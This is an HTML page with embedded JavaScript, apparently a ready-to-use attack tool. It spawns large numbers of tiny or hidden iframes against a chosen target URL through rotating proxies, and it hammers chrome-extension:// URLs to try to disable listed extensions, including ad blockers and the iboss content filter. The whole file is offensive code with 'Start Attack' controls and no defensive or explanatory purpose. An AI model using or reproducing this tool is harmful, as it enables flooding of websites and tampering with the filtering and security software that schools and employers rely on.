<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ultimate Iframe + Extension Manager</title>
<style>
  body {
    background: #000;
    color: #0f0;
    font-family: 'Arial', sans-serif;
    margin: 0;
    padding: 20px;
    overflow-x: hidden;
  }
  h1, h2 {
    text-align: center;
    color: #0f0;
  }
  .container {
    max-width: 1000px;
    margin: auto;
    background: #111;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 0 10px #0f0;
  }
  label, select, input, button, textarea {
    display: block;
    width: 100%;
    margin-top: 10px;
    padding: 10px;
    background: #222;
    color: #0f0;
    border: 1px solid #0f0;
    border-radius: 5px;
  }
  button {
    cursor: pointer;
    background: #0f0;
    color: #000;
    font-weight: bold;
  }
  button:hover {
    background: #0c0;
  }
  .scrollable {
    max-height: 150px;
    overflow-y: auto;
  }
  .status {
    margin-top: 20px;
    text-align: center;
    font-weight: bold;
  }
</style>
</head>
<body>

<h1>Ultimate Iframe + Extension Manager</h1>

<div class="container">
  <h2>Flood Settings</h2>

  <label>Target URL</label>
  <input type="text" id="targetUrl" value="https://example.com">

  <label>Number of Iframes</label>
  <input type="number" id="iframeCount" value="50" min="1">

  <label>Delay Between Iframes (ms)</label>
  <input type="number" id="iframeDelay" value="100" min="0">

  <label>Flood Mode</label>
  <select id="floodMode">
    <option value="aggressive">Ultra Aggressive</option>
    <option value="balanced">Balanced</option>
    <option value="silent">Silent Hidden</option>
  </select>

  <h2>Extension Kill Settings</h2>

  <label>Select Extensions to Target</label>
  <div class="scrollable">
    <select id="extensionDropdown" multiple></select>
  </div>

  <label>Manually Add Extension ID</label>
  <input type="text" id="manualExtensionId" placeholder="Extension ID">

  <button onclick="addManualExtension()">Add Extension</button>

  <h2>Proxy Settings</h2>

  <label>Proxy List (one per line)</label>
  <textarea id="proxyList" placeholder="http://proxy1.com
http://proxy2.com"></textarea>

  <label>Enable Proxy Websurf and Rotation</label>
  <input type="checkbox" id="enableProxyRotate" checked>

  <h2>Controls</h2>

  <button onclick="startFlood()">Start Attack</button>
  <button onclick="stopFlood()">Stop Attack</button>
  <button onclick="killSwitch()">Kill Switch</button>

  <div class="status" id="status">Status: Idle</div>
</div>

<script>
let flooding = false;
let proxyIndex = 0;
let proxies = [];
let iframeInterval;
let frameCounter = 0;
let extensionList = [
  "gighmmpiobklfepjocnamgkkbiglidom", // AdBlock
  "cfhdojbkjhnklbpkdaibdccddilifddb", // Adblock Plus
  "nkeimhogjdpnpccoofpliimaahmaaome", // Grammarly
  "ibnejdfjmmkpcnlpebklmnkoeoihofec", // uBlock Origin
  "lfnaojkojhopbjbpmloofpnjkcjnkddd", // Iboss Client
  // Add more known extension IDs here
];

function populateDropdown() {
  const dropdown = document.getElementById('extensionDropdown');
  extensionList.forEach(id => {
    const option = document.createElement('option');
    option.value = id;
    option.textContent = id;
    dropdown.appendChild(option);
  });
}

function addManualExtension() {
  const id = document.getElementById('manualExtensionId').value.trim();
  if (id) {
    extensionList.push(id);
    const dropdown = document.getElementById('extensionDropdown');
    const option = document.createElement('option');
    option.value = id;
    option.textContent = id;
    dropdown.appendChild(option);
    document.getElementById('manualExtensionId').value = '';
  }
}

function startFlood() {
  if (flooding) return;
  flooding = true;
  proxies = document.getElementById('proxyList').value.split('\n').map(p => p.trim()).filter(p => p);
  proxyIndex = 0;
  frameCounter = 0;
  document.getElementById('status').innerText = "Status: Flooding...";
  attackLoop();
}

function stopFlood() {
  flooding = false;
  clearInterval(iframeInterval);
  document.getElementById('status').innerText = "Status: Stopped.";
}

function attackLoop() {
  const url = document.getElementById('targetUrl').value;
  const iframeCount = parseInt(document.getElementById('iframeCount').value);
  const delay = parseInt(document.getElementById('iframeDelay').value);
  const mode = document.getElementById('floodMode').value;
  const useProxies = document.getElementById('enableProxyRotate').checked;

  let activeExtensions = Array.from(document.getElementById('extensionDropdown').selectedOptions).map(opt => opt.value);

  iframeInterval = setInterval(() => {
    if (!flooding) {
      clearInterval(iframeInterval);
      return;
    }
    if (frameCounter >= iframeCount) {
      clearInterval(iframeInterval);
      document.getElementById('status').innerText = "Status: Done.";
      return;
    }
    spawnIframe(url, mode, useProxies);
    attackExtensions(activeExtensions);
    frameCounter++;
  }, delay);
}

function spawnIframe(url, mode, useProxies) {
  const iframe = document.createElement('iframe');
  let fullUrl = url;
  
  if (useProxies && proxies.length > 0) {
    fullUrl = proxies[proxyIndex % proxies.length] + "/" + url;
    proxyIndex++;
  }

  iframe.src = fullUrl;
  iframe.style.border = "none";

  switch (mode) {
    case 'aggressive':
      iframe.style.width = "1px";
      iframe.style.height = "1px";
      break;
    case 'balanced':
      iframe.style.width = "10px";
      iframe.style.height = "10px";
      break;
    case 'silent':
      iframe.style.width = "0";
      iframe.style.height = "0";
      iframe.style.visibility = "hidden";
      break;
  }

  document.body.appendChild(iframe);

  iframe.onload = () => {
    if (!flooding) iframe.remove();
  };

  // Self-healing if iframe killed
  iframe.onerror = () => {
    if (flooding) spawnIframe(url, mode, useProxies);
  };
}

function attackExtensions(extensionIDs) {
  extensionIDs.forEach(id => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = `chrome-extension://${id}/`;
    document.body.appendChild(iframe);

    setTimeout(() => {
      iframe.remove();
    }, 500);
  });
}

function killSwitch() {
  flooding = false;
  clearInterval(iframeInterval);
  Array.from(document.querySelectorAll('iframe')).forEach(iframe => iframe.remove());
  document.getElementById('status').innerText = "Status: Emergency Kill Activated.";
}

populateDropdown();
</script>

</body>
</html>
